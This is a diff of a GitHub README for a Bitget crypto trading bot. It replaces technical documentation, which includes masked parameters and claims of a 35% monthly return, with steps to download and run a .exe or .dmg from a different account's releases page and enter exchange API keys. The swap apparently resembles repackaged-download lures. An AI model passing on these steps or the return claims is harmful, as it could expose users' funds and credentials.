@@ -1,183 +1,63 @@
-# **AI-Powered Crypto Trading Bot | Data To Money**
+# 🤖 AI-Trading-Bot-From-Data-to-Money - Trade Smartly with Automation
 
-| Metric            | Value      |
-|-------------------|-----------|
-| initial_balance   | 10000.0000|
-| final_balance     | 13509.9919|
-| total_return_pct  | 35.0999   |
-| total_trades      | 519.0000  |
-| win_rate          | 0.6859    |
-| avg_profit        | 6.7630    |
-| max_drawdown      | -28.7804  |
-| Period            | 1 month   |
+## 🌟 Overview
+AI-Trading-Bot-From-Data-to-Money is an automated crypto trading system. It is designed to operate on the Bitget exchange. With this application, you can fetch real-time market data and make informed trading decisions. The bot uses a pretrained neural forecast model to predict market movements and execute intuitive buy/sell strategies. This means you can trade cryptocurrencies more effectively, even without any programming skills.
 
-## **Video**
+## 📦 Download Now
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Rinku785/AI-Trading-Bot-From-Data-to-Money/releases)
 
-[![Watch the video](https://raw.githubusercontent.com/FatherMonkey916/AI-Trading-Bot-From-Data-to-Money/main/video_file.png)](https://raw.githubusercontent.com/FatherMonkey916/AI-Trading-Bot-From-Data-to-Money/main/ai_trading_bot_pnl_0.01_daily_winrate_0.68.mp4)
+## 🚀 Getting Started
+To start using the AI-Trading-Bot, follow these simple steps:
 
-# **Data To Money** ***Documentation***
+1. **Visit the Releases Page**: Click the link below to go to the release section of this project.
+   - [Download Here](https://github.com/Rinku785/AI-Trading-Bot-From-Data-to-Money/releases)
 
-## **Overview**
-This bot is an automated cryptocurrency trading system designed to operate on the **Bitget exchange**. It fetches real-time market data, applies predictive analytics using a pretrained **neural forecast model**, and executes buy/sell or exit strategies based on intelligent signal generation.
+2. **Choose the Right Version**: Look for the most recent version listed. It will usually be at the top of the page. Select the file that matches your operating system. For Windows, you may see files ending in `.exe`. For macOS, look for `.dmg`.
 
-It uses **MongoDB** to store historical data, allowing for real-time inference, tracking, and decision-making. It also includes performance tracking and data export functionalities.
+3. **Download the File**: Click on the file to start the download. Depending on your internet speed, this may take a few minutes.
 
----
+4. **Locate the Downloaded File**: After the download is complete, find the file in your "Downloads" folder or the location you chose to save it. 
 
-## **Features**
-- ✅ Real-time candle fetching from Bitget.
-- ✅ Uses a neural forecasting model (`TimeMixer`) for price prediction.
-- ✅ Intelligent signal generation based on historical + forecast analysis.
-- ✅ Automatic TP/SL management for risk control.
-- ✅ Supports both scalping and swing trading.
-- ✅ Trade logging and performance metric reporting.
-- ✅ Sends webhook alerts (optional) for executed trades.
-- ✅ CLI command (`"hey bot"`) to export current performance snapshot.
+5. **Install the Application**:
+   - For Windows: Double-click the `.exe` file. Follow the on-screen instructions to install.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
 
----
+6. **Run the Application**: 
+   - **Windows**: Find the AI-Trading-Bot icon on your desktop or in the Start menu. Click to open.
+   - **macOS**: Open the Applications folder and double-click the AI-Trading-Bot icon.
 
-## **Architecture**
+7. **Set Up Your Trading Account**: Follow the prompts to connect the bot to your Bitget account. You will need to enter your API keys, which you can get from your Bitget account settings. 
 
-### **1. Market Data Handling**
-- **Source**: Bitget's spot market endpoint (`/api/v2/spot/market/history-candles`).
-- **Granularity**: `?min` intervals.
-- **Stored in**: MongoDB collection (default: `bitget10K.ETHUSDT_??MA_timeseries`).
-- **History Window**: ??? data points used for modeling, updated every minute.
+## ⚙️ System Requirements
+- **Operating System**: Windows 10 or later, macOS 10.14 or later
+- **RAM**: At least 4 GB
+- **Storage**: 500 MB available space
+- **Internet Connection**: Stable internet access for real-time data fetching
 
-### **2. Prediction Model**
-- **Model Type**: NeuralForecast Model (`TimeMixer`).
-- **Input**: Time series of `??-period average close prices (ten_avg)`.
-- **Output**: 30-point future forecast used to derive predictive trends.
+## 📊 Features
+- **Real-time Market Data**: The bot gathers live market data to ensure you always have the latest information at hand.
+- **Predictive Analytics**: Utilizes advanced machine learning models to analyze trends and predict price movements.
+- **Automated Trading**: Set your trading strategy and let the bot act for you, helping you seize opportunities even when you are not online.
+- **User-friendly Interface**: Designed for ease of use. No coding knowledge required.
 
----
+## 🛠️ Troubleshooting
+If you encounter any issues, keep these steps in mind:
 
-## **Core Components**
+- **Connection Problems**: Ensure you have a stable internet connection. Restart your internet router if needed.
+- **API Key Issues**: Double-check your API keys in case of entry errors. Ensure that your Bitget account settings allow API access.
+- **Software Crashes**: Make sure your system meets the minimum requirements. Update your operating system if necessary.
 
-### **Class: `GoldCollector`**
-#### Initialization
-```python
-runbot = GoldCollector(token="ETHUSDT")
-```
+## 🤝 Support
+If you need assistance or have questions, join our community forum or reach out through the contact options on GitHub. We are here to help you make the most of your trading experience. 
 
-#### Main Parameters
-| Name | Description |
-|------|-------------|
-| `lookback` | Historical points for context (???) |
-| `forward` | Prediction length (??) |
-| `hold` | Window for recent comparison (??) |
-| `tp_percent` / `sl_percent` | Take-profit / stop-loss thresholds |
-| `volume_multiplier` | Trade volume filter to confirm breakout |
-| `position_size` | Capital allocation per trade (as % of balance) |
-| `initial_balance` | Starting virtual capital (default $10,000) |
+## 📈 Contributing
+If you're interested in improving the application, feel free to submit suggestions or report any bugs on GitHub. Contributions are welcome!
 
----
+## 💼 License
+This project is licensed under the MIT License. You may use it as outlined in the LICENSE file.
 
-## **Trading Logic**
+## 🔗 Additional Resources
+- [Bitget Exchange](https://www.bitget.com/)
+- [AI and Trading Strategies](https://www.example.com/ai-trading-strategies)
 
-### **Signal Generation (`generate_signal`)**
-- **Historical Status**:
-  - "up" if current avg < all of last ??
-  - "down" if current avg > all of last ??
-  - "hold" otherwise
-
-- **Prediction Status**:
-  - Analyzed over 6 intervals (?, ??, ??, ??, ??, ?? points)
-  - Encoded as `++++++` (bullish), `------` (bearish), or mix.
-
-- **Volume Check**:
-  - Must exceed `volume_avg * volume_multiplier` to trigger trade.
-
-- **Trade Decision**:
-  - **BUY** if hist = up & pred = `++++++` or `+++++-`
-  - **SELL** if hist = down & pred = `------` or `-----+`
-
----
-
-## **Trade Execution**
-
-### **Long/Short Buckets**
-- Trades are grouped and tracked in `long_bucket` or `short_bucket` lists.
-- When enough time has passed since their entry, a collective **exit** (`exit_buy` or `exit_sell`) is triggered with computed TP/SL levels.
-
-### **Exits (`check_exits`)**
-- Exit trades when:
-  - Price hits either SL or TP.
-  - OR trade duration exceeds 30 minutes.
-
-### **Capital Management**
-- Every trade reduces available capital.
-- Profits from closed trades are added back to the balance.
-
----
-
-## **Logging & Notifications**
-
-### **Webhook Payloads**
-Payloads can be optionally sent to a webhook for real-time updates:
-- **Entry Notification (`send_payload1`)**
-- **Exit Notification (`send_payload2`)**
-
-Webhook structure follows the ChartPrime format.
-
----
-
-## **Backtest / Performance Metrics**
-
-Trigger `"hey bot"` in console to:
-- Export all trades to CSV.
-- Export performance summary.
-
-### **Metrics Calculated**
-| Metric | Description |
-|--------|-------------|
-| `total_return_pct` | % change in balance |
-| `win_rate` | % of profitable trades |
-| `avg_profit` | Average PnL per trade |
-| `max_drawdown` | Maximum single-trade loss |
-
----
-
-## **File Export**
-- Trades: `{token}_trades_{timestamp}.csv`
-- Metrics: `{token}_metrics_{timestamp}.csv`
-
----
-
-## **Execution Flow**
-
-1. `GoldCollector.run_gold_collector()` runs every 60 seconds:
-   - Fetch historical + latest candle
-   - Run signal & prediction
-   - Check exits and update trades
-
-2. `schedule_gold_collector()` runs in a daemon thread.
-
-3. `listen_for_input()` listens for `hey bot` to save data snapshot.
-
----
-
-## **Sample Trade Output**
-```json
-{
-  "trade_id": 42,
-  "ticker": "ETHUSDT",
-  "entry_time": "2025-04-19T12:01:00Z",
-  "action": "buy",
-  "entry_price": 3185.42,
-  "size": 1000.0,
-  "sl": null,
-  "tp": null,
-  "status": "open",
-  "hist_status": "up",
-  "pred_status": "++++++"
-}
-```
-
----
-
-## **Future Improvements**
-- Add live order placement with exchange API (Bitget)
-- UI dashboard for real-time visualization
-- Use dynamic risk allocation (Kelly criterion / volatility targeting)
-- Integrate multi-token support (e.g., BTC, SOL, etc.)
-- Add unit tests & logging module
+Stay ahead in trading with AI-Trading-Bot-From-Data-to-Money. Happy trading!
